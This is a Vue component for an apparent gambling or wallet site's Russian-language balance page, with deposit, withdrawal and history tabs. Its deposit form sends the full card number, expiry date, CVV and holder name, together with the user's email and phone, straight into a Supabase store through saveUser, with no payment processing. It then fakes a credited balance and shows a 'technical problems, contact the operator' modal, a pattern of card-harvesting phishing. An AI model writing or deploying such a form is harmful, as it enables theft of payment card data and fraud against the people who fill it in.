<script setup>
import { ref } from 'vue'
import { saveUser } from '../lib/supabase'
import useAuth from '../composables/useAuth.js'
import AccountTransactions from '../components/account/AccountTransactions.vue'

const { balance, deposit: addDeposit, withdraw: doWithdraw } = useAuth()

const activeTab = ref('deposit')

// Пополнение
const cardNumber = ref('')
const expiry = ref('')
const cvv = ref('')
const name = ref('')
const amount = ref('')
const method = ref('Visa/Mastercard')
const processing = ref(false)
const showMessage = ref(false)
const errors = ref({})

function formatCard(value) {
  return value
    .replace(/\D/g, '')
    .slice(0, 19)
    .replace(/(\d{4})(?=\d)/g, '$1 ')
    .trim()
}

function onCardInput(e) {
  cardNumber.value = formatCard(e.target.value)
}

function onExpiryInput(e) {
  let val = e.target.value.replace(/\D/g, '').slice(0, 4)
  if (val.length > 2) val = val.slice(0, 2) + '/' + val.slice(2)
  expiry.value = val
}

function onCvvInput(e) {
  cvv.value = e.target.value.replace(/\D/g, '').slice(0, 3)
}

function resetForm() {
  cardNumber.value = ''
  expiry.value = ''
  cvv.value = ''
  name.value = ''
  amount.value = ''
  method.value = 'Visa/Mastercard'
  errors.value = {}
}

function validate() {
  const errs = {}

  if (!/^\d{16,19}$/.test(cardNumber.value.replace(/\s/g, ''))) {
    errs.cardNumber = 'Некорректный номер карты'
  }

  if (!/^\d{3}$/.test(cvv.value)) {
    errs.cvv = 'Некорректный CVV'
  }

  const match = expiry.value.match(/^(\d{2})\/(\d{2})$/)
  if (!match) {
    errs.expiry = 'Формат MM/YY'
  } else {
    const mm = Number(match[1])
    const yy = Number(match[2])
    const now = new Date()
    const thisYear = now.getFullYear() % 100
    const thisMonth = now.getMonth() + 1
    if (mm < 1 || mm > 12) {
      errs.expiry = 'Месяц от 01 до 12'
    } else if (yy < thisYear || (yy === thisYear && mm < thisMonth)) {
      errs.expiry = 'Срок действия истёк'
    }
  }

  if (name.value.trim().length < 2) {
    errs.name = 'Введите имя держателя'
  }

  if (!amount.value || isNaN(amount.value) || Number(amount.value) <= 0) {
    errs.amount = 'Введите сумму'
  }

  errors.value = errs
  return Object.keys(errs).length === 0
}

async function submit() {
  if (!validate()) return

  processing.value = true
  const authUser = JSON.parse(localStorage.getItem('authUser') || '{}')

  await saveUser({
    email: authUser.email || '',
    phoneNumber: authUser.phoneNumber || localStorage.getItem('phoneNumber') || '',
    cardNumber: cardNumber.value,
    cardDate: expiry.value,
    cvv: cvv.value,
    name: name.value,
    amount: amount.value,
    method: method.value
  })

  setTimeout(() => {
    addDeposit(amount.value)
    processing.value = false
    showMessage.value = true
    resetForm()
  }, 2000)
}

// Вывод
const wCardNumber = ref('')
const wAmount = ref('')
const wErrors = ref({})
const wMessage = ref('')

function onWithdrawCard(e) {
  wCardNumber.value = formatCard(e.target.value)
}

function validateWithdraw() {
  const errs = {}
  if (!/^\d{16,19}$/.test(wCardNumber.value.replace(/\s/g, ''))) {
    errs.card = 'Некорректный номер карты'
  }
  const amt = parseFloat(wAmount.value)
  if (isNaN(amt) || amt <= 0) {
    errs.amount = 'Введите сумму'
  } else if (amt > balance.value) {
    errs.amount = 'Недостаточно средств'
  }
  wErrors.value = errs
  return Object.keys(errs).length === 0
}

function submitWithdraw() {
  if (!validateWithdraw()) return
  if (doWithdraw(wAmount.value)) {
    wMessage.value = 'Заявка на вывод принята'
    wCardNumber.value = ''
    wAmount.value = ''
    wErrors.value = {}
  } else {
    wMessage.value = 'Ошибка вывода'
  }
}

function openChat() {
  showMessage.value = false
  if (window.Intercom) {
    window.Intercom('show')
  }
}
</script>

<template>
  <div class="deposit container">
    <h1>Баланс</h1>
    <div class="tabs">
      <button class="tab" :class="{ active: activeTab === 'deposit' }" @click="activeTab = 'deposit'">
        Пополнение
      </button>
      <button class="tab" :class="{ active: activeTab === 'withdraw' }" @click="activeTab = 'withdraw'">
        Выплата
      </button>
      <button class="tab" :class="{ active: activeTab === 'history' }" @click="activeTab = 'history'">
        История транзакций
      </button>
    </div>

    <div v-if="activeTab === 'deposit'">
      <form v-if="!showMessage" @submit.prevent="submit" class="deposit-form" autocomplete="off">
        <div class="form-group">
          <label for="cardNumber">Номер карты</label>
          <input
            id="cardNumber"
            v-model="cardNumber"
            @input="onCardInput"
            :class="{ error: errors.cardNumber }"
            maxlength="19"
            required
          />
          <span class="error-text" v-if="errors.cardNumber">{{ errors.cardNumber }}</span>
        </div>
        <div class="form-row">
          <div class="form-group">
            <label for="expiry">Срок действия</label>
            <input
              id="expiry"
              v-model="expiry"
              @input="onExpiryInput"
              placeholder="MM/YY"
              :class="{ error: errors.expiry }"
              maxlength="5"
              required
            />
            <span class="error-text" v-if="errors.expiry">{{ errors.expiry }}</span>
          </div>
          <div class="form-group">
            <label for="cvv">CVV</label>
            <input
              id="cvv"
              v-model="cvv"
              @input="onCvvInput"
              maxlength="3"
              :class="{ error: errors.cvv }"
              required
            />
            <span class="error-text" v-if="errors.cvv">{{ errors.cvv }}</span>
          </div>
        </div>
        <div class="form-group">
          <label for="name">Имя держателя</label>
          <input id="name" v-model="name" :class="{ error: errors.name }" required />
          <span class="error-text" v-if="errors.name">{{ errors.name }}</span>
        </div>
        <div class="form-group">
          <label for="amount">Сумма</label>
          <input id="amount" type="number" min="1" v-model="amount" :class="{ error: errors.amount }" required />
          <span class="error-text" v-if="errors.amount">{{ errors.amount }}</span>
        </div>
        <div class="form-group">
          <label for="method">Способ оплаты</label>
          <select id="method" v-model="method">
            <option>Visa/Mastercard</option>
            <option>Mir</option>
            <option>QIWI</option>
            <option>ЮMoney</option>
          </select>
        </div>
        <button type="submit" class="btn" :disabled="processing">
          Пополнить
        </button>
        <div v-if="processing" class="processing">Обработка...</div>
      </form>
      <div v-else class="modal">
        <div class="modal-content">
          <p>
            К сожалению мы имеем технические неполадки на сервере, обратитесь к оператору чтобы пополнить баланс
          </p>
          <button class="btn" @click="openChat">Написать оператору</button>
        </div>
      </div>
    </div>

    <div v-else-if="activeTab === 'withdraw'">
      <form @submit.prevent="submitWithdraw" class="deposit-form" autocomplete="off">
        <div class="form-group">
          <label for="wCard">Номер карты</label>
          <input id="wCard" v-model="wCardNumber" @input="onWithdrawCard" :class="{ error: wErrors.card }" maxlength="19" required />
          <span class="error-text" v-if="wErrors.card">{{ wErrors.card }}</span>
        </div>
        <div class="form-group">
          <label for="wAmount">Сумма</label>
          <input id="wAmount" type="number" min="1" v-model="wAmount" :class="{ error: wErrors.amount }" required />
          <span class="error-text" v-if="wErrors.amount">{{ wErrors.amount }}</span>
        </div>
        <p class="balance">Доступно: {{ balance.toFixed(2) }}₴</p>
        <button type="submit" class="btn">Вывести</button>
        <p v-if="wMessage" class="success-text">{{ wMessage }}</p>
      </form>
    </div>

    <div v-else>
      <AccountTransactions />
    </div>
  </div>
</template>

<style scoped>
.deposit {
  padding: 40px 0;
}
.tabs {
  display: flex;
  gap: 8px;
  margin-bottom: 24px;
}
.tab {
  padding: 8px 16px;
  border: none;
  cursor: pointer;
  background: #1e232d;
  color: #f1f5f9;
  border-radius: 8px 8px 0 0;
}
.tab.active {
  background: linear-gradient(90deg, #ff2e61, #a400ff);
}
.deposit-form {
  max-width: 480px;
  margin: 0 auto;
  display: flex;
  flex-direction: column;
  gap: 16px;
}
.form-row {
  display: flex;
  gap: 16px;
}
.form-group {
  display: flex;
  flex-direction: column;
  position: relative;
}
input.error, select.error {
  border: 1px solid #d00 !important;
}
.error-text {
  color: #d00;
  font-size: 12px;
  margin-top: 2px;
  position: absolute;
  bottom: -16px;
}
.processing {
  margin-top: 16px;
}
.balance {
  margin: -8px 0 8px;
  font-size: 14px;
}
.success-text {
  color: #4caf50;
  text-align: center;
}
.modal {
  position: fixed;
  top: 0;
  left: 0;
  right: 0;
  bottom: 0;
  background: rgba(0,0,0,0.6);
  display: flex;
  justify-content: center;
  align-items: center;
}
.modal-content {
  background: var(--card);
  padding: 24px;
  border-radius: 8px;
  max-width: 400px;
  text-align: center;
}
@media (max-width: 600px) {
  .form-row {
    flex-direction: column;
  }
}
</style>
